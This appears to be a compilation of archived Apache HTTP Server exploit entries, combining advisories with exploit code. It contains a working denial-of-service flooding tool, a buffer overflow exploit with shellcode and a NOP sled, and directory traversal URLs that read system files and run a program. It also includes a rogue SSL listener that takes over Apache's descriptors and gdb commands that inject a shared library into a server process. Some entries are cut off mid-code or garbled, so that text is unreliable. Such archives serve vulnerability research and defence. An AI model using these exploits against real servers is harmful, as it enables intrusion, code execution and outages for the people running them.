41769.content:
"b'Source: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/\\r\
\\r\
## Background\\r\
\\r\
The Apache HTTP Server is an open-source HTTP server for modern operating systems including UNIX, Microsoft Windows, Mac OS/X and Netware. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services observing the current HTTP standards. Apache has been the most popular web server on the Internet since April of 1996.\\r\
\\r\
## Problem Description\\r\
\\r\
During routine testing, an integer overflow was found in apache2-mpm-worker 2.2.19 in the function ap_pregsub called from mod-setenvif. The issue affects all versions from 2.0.x to 2.0.64 and 2.2.x to 2.2.21, not depending on the mode of operation (worker, prefork, ..). When a header field is mangled using SetEnvIf, the new environment variable data can be multiples of the size of the submitted header field. When ap_pregsub from server/util.c calculates the buffer size using\\r\
\\r\
        else if (no < nmatch && pmatch[no].rm_so < pmatch[no].rm_eo) {\\r\
            len += pmatch[no].rm_eo - pmatch[no].rm_so;\\r\
        }\\r\
\\r\
the length value overflows and is used in a subsequent allocation call of buffer too small:\\r\
\\r\
\\r\
    dest = dst = apr_pcalloc(p, len + 1);\\r\
\\r\
The subsequent filling of the buffer with user-supplied data leads to buffer overflow. Even without overflowing, the allocation of significant amounts of server memory for excessivly large environment variables should be considered a problem also.\\r\
\\r\
## Impact\\r\
\\r\
Depending on the input data, exploitation of this issue leads to:\\r\
\\r\
- allocation of large quantities of server memory, killing processes due to out-of-memory conditions or reducing system performance to crawl due to massive swapping.\\r\
- invalid memory access when copying more than 4GB of data into the much smaller buffer. Since the loop copying the data uses only stack and libc-heap, not the apr pool, for source and destination addresses, copy process is linear, starting at low address and pool is separated by unaccessible memory pages for protection on linux. Usually this will only cause termination of the apache process, which is restarted automatically. The impact is increased system load and DOS-condition while under attack.\\r\
- At least with multi-threaded server (worker), arbitrary code execution is proven, on single-threaded varians, the use of crafted stop-sequences might allow code execution even on these systems. On many systems ASLR will reduce the efficiency of the attack, but even with ASLR enabled, the automatic restart of processes allows to probe for all possible mappings of libc. An attacker, that has already access to another account on the machen, might be able to use ApacheNoFollowSymlinkTimerace to learn the memory map of the process, thus having the posibility to reach nearly 100% efficiency.\\r\
\\r\
To trigger this issue, mod_setenvif must be enabled and the attacker has to be able to place a crafted .htaccess file on the server. Since the triggering of the exploit might depend on a magic header field, the malicious .htaccess might be placed as backdoor in web-content .zip files or could be stored dormant on the server until activation by the corresponding magic request.\\r\
\\r\
\\r\
\\r\
\\r\
\\r\
\\r\
Source: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html\\r\
\\r\
## Starting Point\\r\
\\r\
During routine testing, an integer overflow in apache2-mpm-worker 2.2.19 mod-setenvif was found. The crash occured when mangling request headers using a crafted .htaccess-file (http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/SingleThread-htaccess). The broken code was ap_pregsub in server/util.c, where the buffer size of a new header field could overflow, the value was then used for memory allocation. When copying data to the buffer an, overwrite of the an apr (apache portable runtime) memory-pool boundaries occured, similar to standard heap buffer overflows.\\r\
\\r\
## Outline of Exploit\\r\
\\r\
The main goals creating the exploit were:\\r\
\\r\
- Exploit has to be triggerable via HTTP GET requests only\\r\
- Exploit data has to be 0-byte free to have valid HTTP-protocol\\r\
- No alternative way of heap-spraying is used, e.g. GET + content-length. All variants I knew of had much too low efficiency\\r\
- Use libc for ROP, although all libc-addresses start with 0-byte, which cannot be sent via HTTP\\r\
- Rely only on libc address guess, but not heap/stack address guess, unless guess could be made nearly 100% reliable\\r\
- Use the already open HTTP-connections and turn them into command connections on the fly\\r\
- Have exploit in less than 256 bytes\\r\
\\r\
Two different exploit layouts were developed. The first one used multiple threads, so that one was overwriting the data of the second thread before hitting the end of the memory area. Precise timing was essential to get shell access.\\r\
\\r\
The second one used a more crafted substitution expression, stopping the copy in a single thread by modifying the regular expression currently processed in the thread. Since there is race condition involved, this exploit was far more reliable than the first one.'"

23481.content:
\'// source: https://www.securityfocus.com/bid/9302/info\\r\
\\r\
Reportedly, the Apache mod_php module may be prone to a vulnerability that may allow a local attacker to gain access to privileged file descriptors. As a result, the attacker may pose as a legitimate server and possibly steal or manipulate sensitive information. \\r\
\\r\
#include <stdio.h>\\r\
#include <stdlib.h>\\r\
#include <unistd.h>\\r\
#include <signal.h>\\r\
#include <errno.h>\\r\
#include <sys/select.h>\\r\
#include <netinet/in.h>\\r\
#include <openssl/ssl.h>\\r\
\\r\
/*\\r\
 * The basic actions are like this:\\r\
 *      1) Become session leader\\r\
 *      2) Get rid of the parent (apache)\\r\
 *      3) Start handling requests\\r\
 */\\r\
\\r\
#define LISTEN_DESCRIPTOR 4\\r\
#define CERTF "/var/www/html/foo-cert.pem"\\r\
#define KEYF  "/var/www/html/foo-cert.pem"\\r\
\\r\
static SSL_CTX    *ctx;\\r\
static SSL        *ssl;\\r\
static X509       *client_cert;\\r\
static SSL_METHOD *meth;\\r\
\\r\
static void server_loop(int descr);\\r\
static void ssl_init(void);\\r\
\\r\
int main(int argc, char *argv[])\\r\
{\\r\
    /* Need to fork so apache doesn\\\'t kill us */\\r\
    if (fork() == 0) {\\r\
        /* Become session leader */\\r\
        setsid();\\r\
        sleep(2);\\r\
\\r\
        /* just in case one was a controlling tty */\\r\
        close(0); close(1); close(2);\\r\
        ssl_init();\\r\
        server_loop(LISTEN_DESCRIPTOR);\\r\
    }\\r\
    else\\r\
    {\\r\
        sleep(1);\\r\
        system("/usr/sbin/httpd -k stop");\\r\
        sleep(1);\\r\
    }\\r\
    return 0;\\r\
}\\r\
\\r\
static void server_loop(int descr)\\r\
{\\r\
    struct timeval   tv;\\r\
    fd_set read_mask ;\\r\
\\r\
    FD_ZERO(&read_mask);\\r\
    FD_SET(descr, &read_mask);\\r\
    for (;;) {\\r\
        struct sockaddr_in remote;\\r\
        socklen_t len = sizeof(remote);\\r\
        int fd;\\r\
\\r\
        if (select(descr+1, &read_mask, NULL, NULL, 0 ) == -1)\\r\
            continue;\\r\
        fd = accept(descr, &remote, &len);\\r\
        if (fd >=0) {\\r\
            char obuf[1024];\\r\
            if ((ssl = SSL_new (ctx)) != NULL) {\\r\
                SSL_set_fd (ssl, fd);\\r\
                SSL_set_accept_state(ssl);\\r\
                if ((SSL_accept (ssl)) == -1)\\r\
                        exit(1);\\r\
\\r\
                strcpy(obuf, "HTTP/1.0 200 OK\\\
");\\r\
                strcat(obuf, "Content-Length: 40\\\
");\\r\
                strcat(obuf, "Content-Type: text/html\\\
\\\
");\\r\
                strcat(obuf, "<html><body>You\\\'re owned!</body></html>");\\r\
                SSL_write (ssl, obuf, strlen(obuf));\\r\
                SSL_set_shutdown(ssl,\\r\
                        SSL_SENT_SHUTDOWN|SSL_RECEIVED_SHUTDOWN);\\r\
                SSL_free (ssl);\\r\
                ERR_remove_state(0);\\r\
            }\\r\
            close(fd);\\r\
        }\\r\
    }\\r\
    SSL_CTX_free (ctx);  /* Never gets called */\\r\
}\\r\
\\r\
static void ssl_init(void)\\r\
{\\r\
        SSL_load_error_strings();\\r\
        SSLeay_add_ssl_algorithms();\\r\
        meth = SSLv23_server_method();\\r\
        ctx = SSL_CTX_new (meth);\\r\
        if (!ctx)\\r\
                exit(1);\\r\
        if (SSL_CTX_use_certificate_file(ctx, CERTF,\\r\
                        SSL_FILETYPE_PEM) <= 0)\\r\
                exit(1);\\r\
        if (SSL_CTX_use_PrivateKey_file(ctx, KEYF,\\r\
                        SSL_FILETYPE_PEM) <= 0)\\r\
                exit(1);\\r\
        if (!SSL_CTX_check_private_key(ctx))\\r\
                exit(1);\\r\
}\

21697.content:
"source: https://www.securityfocus.com/bid/5434/info\\r\
\\r\
A directory traversal vulnerability exists in Apache versions 2.0.39 and earlier on non-Unix platforms (potentially including Apache compiled with CYGWIN). Platforms that may be affected by this include Windows, OS2, and Netware.\\r\
\\r\
The issue is related to the failure to properly process the backslash \'\\\\\' character, which may be used as a directory delimiter under these platforms. By using the URL encoded sequence \'%2e%2e%5c\', the web root may be escaped.\\r\
\\r\
Exploitation may result in the disclosure of sensitive information. Additionally, arbitrary local programs may be executed with attacker supplied parameters if directory traversal techniques are used to escape the cgi-bin directory.\\r\
\\r\
http://127.0.0.1/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini\\r\
http://127.0.0.1/cgi-bin/%5c%2e%2e%5cbin%5cwintty.exe?%2dt+HELLO"

41768.exploit title: Apache 2.2 - Scoreboard Invalid Free On Shutdown
41768.content:
\'Source: http://www.halfdog.net/Security/2011/ApacheScoreboardInvalidFreeOnShutdown/\\r\
\\r\
## Introduction\\r\
\\r\
Apache 2.2 webservers may use a shared memory segment to share child process status information (scoreboard) between the child processes and the parent process running as root. A child running with lower privileges than the parent process might trigger an invalid free in the privileged parent process during parent shutdown by modifying data on the shared memory segment.\\r\
\\r\
## Method\\r\
\\r\
A child process can trigger the bug by changing the value of ap_scoreboard_e sb_type, which resides in the global_score structure on the shared memory segment. The value is usually 2 (SB_SHARED):\\r\
\\r\
typedef struct {\\r\
    int             server_limit;\\r\
    int             thread_limit;\\r\
    ap_scoreboard_e sb_type;\\r\
    ap_generation_t running_generation; /* the generation of children which\\r\
                                         * should still be serving requests.\\r\
                                         */\\r\
    apr_time_t restart_time;\\r\
    int             lb_limit;\\r\
} global_score;\\r\
\\r\
When changing the scoreboard type of a shared memory segment to something else, the root process will try to release the shared memory using free during normal shutdown. Since the memory was allocated using mmap, not malloc, the call to free from ap_cleanup_scoreboard (server/scoreboard.c) triggers abort within libc.\\r\
\\r\
apr_status_t ap_cleanup_scoreboard(void *d)\\r\
{\\r\
    if (ap_scoreboard_image == NULL) {\\r\
        return APR_SUCCESS;\\r\
    }\\r\
    if (ap_scoreboard_image->global->sb_type == SB_SHARED) {\\r\
        ap_cleanup_shared_mem(NULL);\\r\
    }\\r\
    else {\\r\
        free(ap_scoreboard_image->global);\\r\
        free(ap_scoreboard_image);\\r\
        ap_scoreboard_image = NULL;\\r\
    }\\r\
    return APR_SUCCESS;\\r\
}\\r\
\\r\
Abort output is written to apache default error log:\\r\
\\r\
[Fri Dec 30 10:19:57 2011] [notice] caught SIGTERM, shutting down\\r\
*** glibc detected *** /usr/sbin/apache2: free(): invalid pointer: 0xb76f4008 ***\\r\
======= Backtrace: =========\\r\
/lib/i386-linux-gnu/libc.so.6(+0x6ebc2)[0x17ebc2]\\r\
/lib/i386-linux-gnu/libc.so.6(+0x6f862)[0x17f862]\\r\
/lib/i386-linux-gnu/libc.so.6(cfree+0x6d)[0x18294d]\\r\
/usr/sbin/apache2(ap_cleanup_scoreboard+0x29)[0xa57519]\\r\
/usr/lib/libapr-1.so.0(+0x19846)[0x545846]\\r\
/usr/lib/libapr-1.so.0(apr_pool_destroy+0x52)[0x5449ec]\\r\
/usr/sbin/apache2(+0x1f063)[0xa52063]\\r\
/usr/sbin/apache2(main+0xeea)[0xa51e3a]\\r\
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x129113]\\r\
/usr/sbin/apache2(+0x1ef3d)[0xa51f3d]\\r\
======= Memory map: ========\\r\
00110000-00286000 r-xp 00000000 08:01 132367\\r\
\\r\
To reproduce, attach to a www-data (non-root) child process and increment the value at offset 0x10 in the shared memory segment. The search and replace can also be accomplished by compiling LibScoreboardTest.c (http://www.halfdog.net/Security/2011/ApacheScoreboardInvalidFreeOnShutdown/LibScoreboardTest.c) and loading it into a child process using gdb --pid [childpid] and following commands:\\r\
\\r\
set *(int*)($esp+4)="/var/www/libExploit.so"\\r\
set *(int*)($esp+8)=1\\r\
set $eip=*__libc_dlopen_mode\\r\
continue\\r\
\\r\
Without gdb, the mod_setenv exploit demo (2nd attempt) (http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html) could be used to load the code.\\r\
\\r\
\\r\
--- LibScoreboardTest.c ---\\r\
/** gcc -Wall -c LibScoreboardTest.c\\r\
 *  ld -shared -Bdynamic LibScoreboardTest.o -L/lib -lc -o LibScoreboardTest.so\\r\
 */\\r\
\\r\
#include <fcntl.h>\\r\
#include <unistd.h>\\r\
#include <stdio.h>\\r\
#include <stdlib.h>\\r\
\\r\
extern void _init() {\\r\
  int\ fd=-1, pos;\\r\
  char\ mmapData[1<<16];\\r\
  int\ mmapDataLen;\\r\
  char\ str[1024];\\r\
\\r\
  char*\ sharedSegStart=NULL;\\r\
  char* sharedSegEnd=NULL;\\r\
  int\ sharedSegLen;\\r\
  int\ result;\\r\
\\r\
  fd=open("/proc/self/maps", O_RDONLY);\\r\
  mmapDataLen=0;\\r\
  while((result=read(fd, mmapData+mmapDataLen, sizeof(mmapData)-mmapDataLen))>0) mmapDataLen+=result;\\r\
  close(fd);\\r\
\\r\
  fd=open("/tmp/testlog", O_RDWR|O_CREAT, 0777);\\r\
  result=sprintf(str, "Read %d\\\
", mmapDataLen);\\r\
  write(fd, str, result);\\r\
  write(fd, mmapData, mmapDataLen);\\r\
\\r\
  for(pos=0; pos<mmapDataLen;) {\\r\
    result=sscanf(mmapData+pos, "%8x-%8x rw-s %8x ",\\r\
        (int*)&sharedSegStart, (int*)&sharedSegEnd, &result);\\r\
    if(result==3) break;\\r\
    while((pos<mmapDataLen)&&(mmapData[pos]!=\\\'\\\
\\\')) pos++;\\r\
    if(pos==mmapDataLen) break;\\r\
    pos++;\\r\
  }\\r\
  result=sprintf(str, "Shared seg data 0x%x-0x%x\\\
", (int)sharedSegStart,\\r\
      (int)sharedSegEnd);\\r\
  write(fd, str, result);\\r\
\\r\
  if(pos==mmapDataLen) return;\\r\
\\r\
// Set ap_scoreboard_e sb_type=3\\r\
  *(int*)(sharedSegStart+0x10)=3;\\r\
  exit(0);\\r\
}\\r\
--- EOF --\

9.content:
\'/* apache-massacre.c\\r\
* Test code for Apache 2.x Memory Leak\\r\
* By Matthew Murphy\\r\
*\\r\
* DISCLAIMER: This exploit tool is provided only to test networks for a\\r\
* known vulnerability. Do not use this tool on systems you do not control,\\r\
* and do not use this tool on networks you do not own without appropriate\\r\
* consent from the network owner. You are responsible for any damage your\\r\
* use of the tool causes. In no event may the author of this tool be held\\r\
* responsible for damages relating to its use.\\r\
*\\r\
* As with most Apache exposures, the impacts vary between ports of the server:\\r\
*\\r\
* Non-Unix (Win32, Netware, OS/2): These ports are most adversely affected\\r\
* by this, as Apache\\\'s child process doesn\\\'t terminate normally unless the\\r\
* parent process stops. This means that leaks (and any performance loss) hang\\r\
* around until Apache is restarted.\\r\
*\\r\
* Unix/mpm_prefork: This MPM offers the most protection against successful\\r\
* exploitation, as its processes exit at the end of the request.\\r\
*\\r\
* Unix/other MPMs: These other MPMs utilize multiple Apache processes for \\r\
* multiple Apache requests. Depending on the MPM in use and the traffic rates\\r\
* of the server, this may be used to the advantage of a potential attacker.\\r\
* If multiple different Apache processes are utilized, an attacker can spread\\r\
* the substantial leak between processes to dodge resource limits imposed on\\r\
* httpd\\\'s UID (usually nobody, www, or apache)\\r\
*\\r\
* Credit: iDEFENSE reported this issue to several security lists on April 8,\\r\
* 2003 following the Apache release announcement. Apache fixed the flaw about\\r\
* a month after the initial disclosure of this vulnerability. iDEFENSE credits\\r\
* the discovery of this vulnerability to an anonymous researcher.\\r\
*\\r\
* Happy Hunting!\\r\
*/\\r\
\\r\
#ifndef _WIN32\\r\
#include <netdb.h>\\r\
#include <sys/types.h>\\r\
#include <sys/socket.h>\\r\
#include <sys/wait.h>\\r\
#include <sys/stat.h>\\r\
#include <sys/time.h>\\r\
#include <netinet/in.h>\\r\
#include <fcntl.h>\\r\
#else\\r\
#include <windows.h>\\r\
#pragma comment(lib, "wsock32.lib")\\r\
#endif\\r\
#include <stdlib.h>\\r\
#include <stdio.h>\\r\
\\r\
int sig_fired = 0;\\r\
\\r\
#ifndef _WIN32\\r\
void sig_handler(int sig) {\\r\
#else\\r\
BOOL WINAPI sig_handler(DWORD dwCtrlType) {\\r\
#endif\\r\
sig_fired = 1;\\r\
#ifndef _WIN32\\r\
return;\\r\
#else\\r\
return TRUE;\\r\
#endif\\r\
}\\r\
\\r\
int main(int argc, char *argv[]) {\\r\
SOCKET s;\\r\
struct sockaddr_in sin;\\r\
char buffer[1025];\\r\
struct hostent *he;\\r\
unsigned short iPort = 80;\\r\
int newlines = 100;\\r\
char *p;\\r\
char *p2;\\r\
int i;\\r\
#ifdef _WIN32\\r\
WSADATA wsa_prov;\\r\
#endif\\r\
printf("Apache Massacre v1.0\\\\r\\\
");\\r\
printf("Exploit by Matthew Murphy\\\\r\\\
");\\r\
printf("Vulnerability reported by iDEFENSE Labs\\\\r\\\
\\\\r\\\
");\\r\
#ifdef _WIN32\\r\
if (WSAStartup(0x0101, &wsa_prov)) {\\r\
perror("WSAStartup");\\r\
exit(1);\\r\
}\\r\
#endif\\r\
printf("Please enter the web server\\\'s host/IP: ");\\r\
fgets(&buffer[0], 1024, stdin);\\r\
he = gethostbyname(&buffer[0]);\\r\
if (!he) {\\r\
perror("gethostbyname");\\r\
exit(1);\\r\
}\\r\
sin.sin_addr.s_addr = *((unsigned long *)he->h_addr);\\r\
printf("Please enter the web server\\\'s port: ");\\r\
fgets(&buffer[0], 1024, stdin);\\r\
iPort = (unsigned short)atoi(&buffer[0]);\\r\
#ifndef _WIN32\\r\
#ifdef _SOLARIS\\r\
sigset(SIGINT, &sig_handler);\\r\
#else\\r\
signal(SIGINT, &sig_handler);\\r\
#endif\\r\
#else\\r\
SetConsoleCtrlHandler(&sig_handler, TRUE);\\r\
#endif\\r\
printf("How many newlines should be in each request [100]: ");\\r\
fgets(&buffer[0], 1024, stdin);\\r\
if (!buffer[0] == 0x0D && !buffer[0] == 0x0A) {\\r\
newlines = atoi(&buffer[0]);\\r\
}\\r\
p = malloc(newlines*2);\\r\
p2 = p;\\r\
for (i = 0; i < newlines; i++) {\\r\
*p2 = 0x0D;\\r\
p2++;\\r\
*p2 = 0x0A;\\r\
p2++;\\r\
}\\r\
newlines += newlines;\\r\
s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\\r\
if (s < 0) {\\r\
perror("socket");\\r\
exit(1);\\r\
}\\r\
sin.sin_family = AF_INET;\\r\
sin.sin_port = htons(iPort);\\r\
if (connect(s, (const struct sockaddr *)&sin, sizeof(struct sockaddr_in))) {\\r\
perror("connect");\\r\
exit(1);\\r\
}\\r\
while (1) {\\r\
if (!send(s, (char *)p, newlines, 0) == newlines) {\\r\
perror("send");\\r\
exit(1);\\r\
}\\r\
if (sig_fired) {\\r\
printf("Terminating on SIGINT");\\r\
free(p);\\r\
#ifndef _WIN32\\r\
close(s);\\r\
#else\\r\
closesocket(s);\\r\
WSACleanup();\\r\
#endif\\r\
exit(0);\\r\
}\\r\
}\\r\
}\\r\
\\r\
\\r\
// milw0rm.com [2003-04-09]\

24590.exploit title: Apache mod_ssl 2.0.x - Remote Denial of Service
24590.content:
"source: https://www.securityfocus.com/bid/11154/info\\r\
\\r\
Apache 2.x mod_ssl is reported prone to a remote denial of service vulnerability. This issue likely exists because the application fails to handle exceptional conditions. The vulnerability originates in the \'char_buffer_read\' function of the \'ssl_engine_io.c\' file. \\r\
\\r\
It is likely that this issue only results in a denial of service condition in child process. This BID will be updated as more information becomes available.\\r\
\\r\
Apache 2.0.50 is reported to be affected by this issue, however, it is possible that other versions are vulnerable as well.\\r\
\\r\
With the following configuration in httpd.conf:\\r\
Listen 47290\\r\
SSLProxyEngine on\\r\
RewriteEngine on\\r\
RewriteRule /(.*) https://www.example.com/$1 [P]\\r\
\\r\
The server may be crashed by issuing the following URI:\\r\
http://www.example.com:47290/eRoomASP/CookieTest.asp?facility=facility&URL=%2FeRoom%2FFacility%2FRoom%2F0_4242"

25624.exploit title: Apache 1.3.x - HTDigest Realm Command Line Argument Buffer Overflow (1)
25624.content:
\'// source: https://www.securityfocus.com/bid/13537/info\\r\
\\r\
A buffer overflow vulnerability exists in the htdigest utility included with Apache. The vulnerability is due to improper bounds checking when copying user-supplied realm data into local buffers.\\r\
\\r\
By supplying an overly long realm value to the command line options of htdigest, it is possible to trigger an overflow condition. This may cause memory to be corrupted with attacker-specified values.\\r\
\\r\
This issue could be exploited by a remote attacker; potentially resulting in the execution of arbitrary system commands within the context of the web server process. \\r\
\\r\
#include <stdio.h>\\r\
#include <string.h>\\r\
#include <arpa/inet.h>\\r\
\\r\
/********************************************************************************/\\r\
\\r\
#define IP "127.1.1.1"\\r\
#define PORT 1337\\r\
\\r\
unsigned int addys[] = { 0xbffffadd, // debian 3.1\\r\
                        };\\r\
// which address to use\\r\
#define ADDY 0\\r\
\\r\
/*******************************************************************************/\\r\
\\r\
\\r\
// Point Of EIP - The ammount of data we must write to completely overflow eip\\r\
#define POE 395\\r\
\\r\
// netric callback shellcode\\r\
char cb[] =\\r\
        "\\\\x31\\\\xdb\\\\x6a\\\\x17\\\\x58\\\\xcd\\\\x80\\\\x31\\\\xc0\\\\x50\\\\x68\\\\x2f\\\\x2f\\\\x73\\\\x68".\\r\
"\\\\x68\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x89\\\\xe3\\\\x50\\\\x53\\\\x89\\\\xe1\\\\x99\\\\xb0\\\\x0b\\\\xcd\\\\x80";\\r\
\\r\
#define IP_OFFSET       33\\r\
#define PORT_OFFSET     39\\r\
\\r\
void changeip(char *ip);\\r\
void changeport(char *code, int port, int offset);\\r\
\\r\
int main (void) {\\r\
        char buff[416];\\r\
        int a;\\r\
\\r\
        changeip(IP);\\r\
        changeport(cb, PORT, PORT_OFFSET);\\r\
\\r\
        for (a = 0; a < 200; a++)\\r\
                *(buff+a) = 0x90;\\r\
\\r\
        for (int b = 0; *(cb+b); a++, b++)\\r\
                *(buff+a) = *(cb+b);\\r\
\\r\
        for (; a + 4 <= POE; a += 4)\\r\
                memcpy(buff+a, (addys+ADDY), 4);\\r\
\\r\
        *(buff+a) = 0;\\r\
\\r\
        fwrite(buff, strlen(buff), 1, stdout);\\r\
        return(0);\\r\

\\r\
// ripped from some of snooq\\\'s code\\r\
void changeip(char *ip) {\\r\
       char *ptr;\\r\
       ptr=cb+IP_OFFSET;\\r\

       *((long *)ptr)=inet_addr(ip);\\r\
}\\r\
\\r\
// ripped from some of snooq\\\'s code\\r\
void changeport(char *code, int port, int offset) {\\r\
        char *ptr;\\r\
        ptr=code+offset;\\r\
        /* Assume Little-Endianess.... */\\r\
        *ptr++=(char)((port>>8)&0xff);\\r\
        *ptr++=(char)(port&0xff);\\r\
}\

25625.exploit title: Apache 1.3.x - HTDigest Realm Command Line Argument Buffer Overflow (2)
25625.content:
\'// source: https://www.securityfocus.com/bid/13537/info\\r\
 \\r\
A buffer overflow vulnerability exists in the htdigest utility included with Apache. The vulnerability is due to improper bounds checking when copying user-supplied realm data into local buffers.\\r\
 \\r\
By supplying an overly long realm value to the command line options of htdigest, it is possible to trigger an overflow condition. This may cause memory to be corrupted with attacker-specified values.\\r\
 \\r\
This issue could be exploited by a remote attacker; potentially resulting in the execution of arbitrary system commands within the context of the web server process. \\r\
\\r\

 * compile with: gcc -o htdigest-realm-bof htdigest-realm-bof.c -std=c99\\r\
 * \\r\
 * One thing to note, apache seems to have htdigest going on quite odd, this code was written\\r\
 * for the version that the htdigest sh script links together, debian seems to install the actual binary,\\r\

28365.exploit title: Apache 2.2.2 - CGI Script Source Code Information Disclosure
28365.content:
"b'source: https://www.securityfocus.com/bid/19447/info\\r\
\\r\
Apache is prone to an information-disclosure vulnerability because it fails to properly handle exceptional conditions.\\r\
\\r\
An attacker can exploit this issue to retrieve script source code. Information obtained may aid in further attacks.\\r\
\\r\
Versions 2.2.2 for Microsoft Windows is vulnerable to this issue; other versions may also be affected.\\r\
\\r\
http://www.example.com/CGI-BIN/foo'"

34133.exploit title: Apache 2.4.7 mod_status - Scoreboard Handling Race Condition
34133.content:
\'--[ 0. Sparse summary\\r\ Race condition between updating httpd\\\'s "scoreboard" and mod_status,\\r\ leading to several critical scenarios like heap buffer overflow with\\r\ user\\r\ supplied payload and leaking heap which can leak critical memory\\r\ containing\\r\ htaccess credentials, ssl certificates private keys and so on.\\r\ --[ 1. Prerequisites\\r\ \\r\ Apache httpd compiled with MPM event or MPM worker.\\r\ The tested version was 2.4.7 compiled with:\\r\ \\r\ ./configure --enable-mods-shared=reallyall --with-included-apr\\r\ \\r\ The tested mod_status configuration in httpd.conf was:\\r\ SetHandler server-status\\r\ ExtendedStatus On\\r\ --[ 2. Race Condition\\r\ \\r\ Function ap_escape_logitem in server/util.c looks as follows:\\r\ \\r\ 1908AP_DECLARE(char *) ap_escape_logitem(apr_pool_t *p, const char\\r\ *str)\\r\ 1909{\\r\ 1910 char *ret;\\r\ 1911 unsigned char *d;\\r\ 1912 const unsigned char *s;\\r\ 1913 apr_size_t length, escapes = 0;\\r\ 1914\\r\ 1915 if (!str) {\\r\ 1916 return NULL;\\r\ 1917 }\\r\ 1918\\r\ 1919 /* Compute how many characters need to be escaped */\\r\ 1920 s = (const unsigned char *)str;\\r\ 1921 for (; *s; ++s) {\\r\ 1922 if (TEST_CHAR(*s, T_ESCAPE_LOGITEM)) {\\r\ 1923 escapes++;\\r\ 1924 }\\r\ 1925 }\\r\ 1926\\r\ 1927 /* Compute the length of the input string, including NULL\\r\ */\\r\ 1928 length = s - (const unsigned char *)str + 1;\\r\ 1929\\r\ 1930 /* Fast path: nothing to escape */\\r\ 1931 if (escapes == 0) {\\r\ 1932 return apr_pmemdup(p, str, length);\\r\ 1933 }\\r\ \\r\ In the for-loop between 1921 and 1925 lines function is computing the\\r\ length of\\r\ supplied str (almost like strlen, but additionally it counts special\\r\ characters\\r\ which need to be escaped). As comment in 1927 value says, function\\r\ computes count\\r\ of bytes to copy. If there\\\'s nothing to escape function uses\\r\ apr_pmemdup to duplicate\\r\ the str. In our single-threaded mind everything looks good, but tricky\\r\ part starts\\r\ when we introduce multi-threading. Apache in MPM mode runs workers as\\r\ threads, let\\\'s\\r\ consider the following scenario:\\r\ \\r\ 1) ap_escape_logitem(pool, "") is called\\r\ 2) for-loop in 1921 line immediately escapes, because *s is in\\r\ first loop run\\r\ 3) malicious thread change memory under *s to another value\\r\ (something which is not )\\r\ 4) apr_pmemdup copies that change value to new string and returns\\r\ it\\r\ \\r\ Output from the ap_escape_logitem is considered to be a string, if\\r\ scenario above would occur,\\r\ then returned string would not be zeroed at the end, which may be\\r\ harmful. The mod_status\\r\ code looks as follows:\\r\ \\r\ 833 ap_rprintf(r, "%s%s"\\r\ 834 "%snn",\\r\ 835 ap_escape_html(r->pool,\\r\ 836 \\r\ ws_record->client),\\r\ 837 ap_escape_html(r->pool,\\r\ 838 \\r\ ws_record->vhost),\\r\ 839 ap_escape_html(r->pool,\\r\ 840 \\r\ ap_escape_logitem(r->pool,\\r\ 841 \\r\ ws_record->request)));\\r\ \\r\ The relevant call to ap_escape_html() is at line 839 after the\\r\ evaluation of ap_escape_logitem().\\r\ The first argument passed to the ap_escape_logitem() is in fact an apr\\r\ pool associated with\\r\ the HTTP request and defined in the request_rec structure.\\r\ \\r\ This code is a part of a larger for-loop where code is iterating over\\r\ worker_score structs which is\\r\ defined as follows:\\r\ \\r\ 90struct worker_score {\\r\ 91#if APR_HAS_THREADS\\r\ 92 apr_os_thread_t tid;\\r\ 93#endif\\r\ 94 int thread_num;\\r\ 95 /* With some MPMs (e.g., worker), a worker_score can\\r\ represent\\r\ 96 * a thread in a terminating process which is no longer\\r\ 97 * represented by the corresponding process_score. These\\r\ MPMs\\r\ 98 * should set pid and generation fields in the worker_score.\\r\ 99 */\\r\ 100 pid_t pid;\\r\ 101 ap_generation_t generation;\\r\ 102 unsigned char status;\\r\ 103 unsigned short conn_count;\\r\ 104 apr_off_t conn_bytes;\\r\ 105 unsigned long access_count;\\r\ 106 apr_off_t bytes_served;\\r\ 107 unsigned long my_access_count;\\r\ 108 apr_off_t my_bytes_served;\\r\ 109 apr_time_t start_time;\\r\ 110 apr_time_t stop_time;\\r\ 111 apr_time_t last_used;\\r\ 112#ifdef HAVE_TIMES\\r\ 113 struct tms times;\\r\ 114#endif\\r\ 115 char client[40]; /* Keep \\\'em small... but large\\r\ enough to hold an IPv6 address */\\r\ 116 char request[64]; /* We just want an idea... */\\r\ 117 char vhost[32]; /* What virtual host is being\\r\ accessed? */\\r\ 118};\\r\ \\r\ The \\\'request\\\' field in a worker_score structure is particularly\\r\ interesting - this field can be changed inside\\r\ the copy_request function, which is called by the\\r\ update_child_status_internal. This change may occur when the\\r\ mod_status is iterating over the workers at the same time the\\r\ ap_escape_logitem is called within a different\\r\ thread, leading to a race condition. We can trigger this exact\\r\ scenario in order to return a string without a\\r\ trailing . This can be achived by running two clients, one triggering\\r\ the mod_status handler and second\\r\ sending random requests to the web server. Let\\\'s consider the\\r\ following example:\\r\ \\r\ 1) the mod_status iterates over workers invoking\\r\ update_child_status_internal()\\r\ 2) at some point for one worker mod_status calls\\r\ ap_escape_logitem(pool, ws_record->request)\\r\ 3) let\\\'s asume that ws_record->request at the beginning is ""\\r\ literally at the first byte.\\r\ 4) inside the ap_escape_logitem function the length of the\\r\ ws_record->request is computed, which is 1\\r\ (an empty string consisting of )\\r\ 5) another thread modifies ws_record->request (in fact it\\\'s called\\r\ ws->request in update_child_status_internal\\r\ function but it\\\'s exactly the same location in memory) and puts\\r\ there i.e. "GET / HTTP/1.0"\\r\ 6) the ap_pmemdup(pool, str, 1) in ap_escape_logitem copies the\\r\ first one byte from "GET / HTTP/1.0" - "G" in\\r\ that case and returns it. The ap_pmemdup looks as follows:\\r\ \\r\ 112APR_DECLARE(void *) apr_pmemdup(apr_pool_t *a, const void\\r\ *m, apr_size_t n)\\r\ 113{\\r\ 114 void *res;\\r\ 115\\r\ 116 if (m == NULL)\\r\ 117 return 